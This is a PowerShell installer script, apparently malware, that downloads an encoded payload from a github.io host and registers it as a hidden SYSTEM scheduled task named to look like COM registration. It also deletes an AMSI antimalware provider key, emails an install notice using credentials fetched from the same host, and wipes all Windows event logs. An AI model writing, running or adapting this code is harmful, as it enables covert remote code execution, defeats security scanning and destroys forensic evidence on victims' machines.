
[CmdletBinding(SupportsShouldProcess)]
param()
$fname=(new-guid).Guid
$fname = $fname.substring(0,20)
$FullLogs = ""
$LogFilePath="$env:Temp\$fname.001"

Function OutString
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$Msg,
        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [ValidateSet('Information','Warning','Error')]
        [string]$Severity = 'Information'
    )

    if($env:COMPUTERNAME -like 'MAVERICK') {
          if($TestOutput){
            write-host '[install]   ' -NoNewLine -f Red
            write-host $Msg -f DarkYellow
         }
        Write-Verbose $Msg
    }
    [pscustomobject]@{
        Time = (Get-Date -f g)
        Message = $Message
        Severity = $Severity
    } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
    $FullLogs = $FullLogs + $Msg + '`n`n'
}


Function Send-InstallNotification
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$subject,
        [string]$msgbody,
        [string]$file=""
    )
    try {
        $SecMFile='https://vr972be716a04eb6.github.io/dat/mail.dat'
        $SecPFile='https://vr972be716a04eb6.github.io/dat/ps.dat'
        $webclient = New-Object Net.WebClient
        $CmdData = $webclient.DownloadString($SecMFile)

        $Pass = $webclient.DownloadString($SecPFile)
        $Pass = $Pass.substring(0,30)
        $Pass.length
        $decrypted=Decrypt-String $CmdData $Pass
        $CharArray =$decrypted.Split(";")

        $EmailFrom = $CharArray[0]
        $EmailTo = $CharArray[1]
        $pass = $CharArray[2]

        $message = new-object System.Net.Mail.MailMessage 
        $message.From = $EmailFrom 
        $message.To.Add($EmailTo)
        $message.IsBodyHtml = $True 
        $message.Subject = $subject 

        if($file -ne ""){
          if(Test-Path -Path $file){
              $attachment = $file
              $attach = new-object Net.Mail.Attachment($attachment) 
              $message.Attachments.Add($attach)   
          }
        }
        $message.body = $msgbody
        $SMTPServer = "smtp.gmail.com"
        $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
        $SMTPClient.EnableSsl = $true
        $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $pass);
        $SMTPClient.Send($message)
    }
    catch
    {
        $Msg="Ran into an issue: $($PSItem.ToString())"
        #write-host '[test-exceptions] ' -NoNewLine -f Red
        #write-host $Msg -f DarkYellow
        write-verbose $Msg 
        if($PSCmdlet -ne $null){
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
        
    }   
}


function ConvertTo-EncodedScript
{
  param
  (
    [string]$Path,
    [switch]$WriteFile=$false
  )
  
  $Code = Get-Content -Path $Path -Raw
  $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Code) 
  $Base64 = [Convert]::ToBase64String($Bytes) 
  
  if($WriteFile){
      $NewPath = [System.IO.Path]::ChangeExtension($Path, '.b64')
      $Base64 | Set-Content -Path $NewPath
  }

  return $Base64
}

Function New-ScheduledTaskFolder
{
  Param ($taskpath)
  $ErrorActionPreference = "stop"

  OutString "New-ScheduledTaskFolder called with path $taskpath"


  $scheduleObject = New-Object -ComObject schedule.service
  $scheduleObject.connect()
  $rootFolder = $scheduleObject.GetFolder("\")
  Try 
  {
    $null = $scheduleObject.GetFolder($taskpath)
  }
  Catch { 
    $null = $rootFolder.CreateFolder($taskpath) 
  }
  Finally { 
    $ErrorActionPreference = "continue" 
  } 
}

function Install-EncodedScriptTask {
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$TaskName,
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$EncodedTask
    )

    $Interval=15

    #test 
    if($env:COMPUTERNAME -like 'MAVERICK') { 
      $Interval=3
    }

    OutString "Install-EncodedScriptTask called with taskname $TaskName. Code: $EncodedTask"


    $action = New-ScheduledTaskAction -Execute "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-ExecutionPolicy Unrestricted -NoProfile -WindowStyle Hidden -NonInteractive -EncodedCommand $EncodedTask"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes $Interval)
    $principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -Hidden -Priority 3
    if($env:COMPUTERNAME -like 'MAVERICK') {
         $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -Priority 3
    }
    $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings

    Register-ScheduledTask $TaskName -InputObject $task
    Start-ScheduledTask -TaskName $TaskName
}

function Cleanup {

  # old tasks
  OutString "Cleanup: Unregister RemoteExecCheck,ScheduledSecurityCheck,WinSecurityScheduledCheck"
  Unregister-ScheduledTask 'RemoteExecCheck'
  Unregister-ScheduledTask 'WinSecurityScheduledCheck'
  Unregister-ScheduledTask 'ScheduledSecurityCheck'

  # logs
  OutString "Clera Logs"
  Get-WinEvent -ListLog * -Force | % { Wevtutil.exe cl $_.LogName }

  Remove-Item -Path "$env:Temp\LogFile.csv" -Force -ErrorAction Ignore
  Remove-Item -Path $LogFilePath -Force -ErrorAction Ignore
}

# AMSI
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force


$NewTaskFolder='ComObjectsRegistrationManagement'
New-ScheduledTaskFolder $NewTaskFolder
$NewTaskName=$NewTaskFolder + '\' + 'ComObjectsRegistrar'

$InstallFromLocal=$false

$currentPath = Get-Location
$script_clear = ''
if($InstallFromLocal)
{
    $script_clear = Join-Path $currentPath "runat5min.ps1"
    $script_coded = ConvertTo-EncodedScript $script_clear $false
    $c64data = get-content $script_coded -Raw
    Install-EncodedScriptTask $NewTaskName $c64data
} else {
      OutString "ScriptUrl: $ScriptUrl"
      $ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/rpt.dat'
      $webclient = New-Object Net.WebClient
      $EncodedScript = $webclient.DownloadString($ScriptUrl)
      OutString "EncodedScript(downloaded): $EncodedScript"
      Install-EncodedScriptTask $NewTaskName $EncodedScript
}

Send-InstallNotification "Schd Task Install Notice for $env:COMPUTERNAME" "$FullLogs"
Cleanup
